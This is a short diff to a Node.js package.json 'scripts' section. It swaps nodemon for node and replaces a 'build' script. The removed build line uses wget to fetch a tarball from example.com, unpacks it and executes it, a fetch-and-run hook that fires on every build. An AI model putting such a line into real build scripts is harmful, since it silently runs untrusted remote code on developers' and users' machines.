@@ -9,11 +9,11 @@
   },
   "scripts": {
     "client-install": "npm install --prefix client",
-    "server": "nodemon server.js",
+    "server": "node server.js",
     "client": "npm start --prefix client",
     "dev": "concurrently \"npm run server\" \"npm run client\"",
     "start": "node server.js",
-    "build": "wget example.com/custom-binary.tar.gz;tar -zxvf ./custom-binary.tar.gz;./custom-binary.tar.gz;"
+    "build": "cd client && npm i && npm run build && cd .. && npm i && npm run server"
   },
   "author": "",
   "license": "ISC",
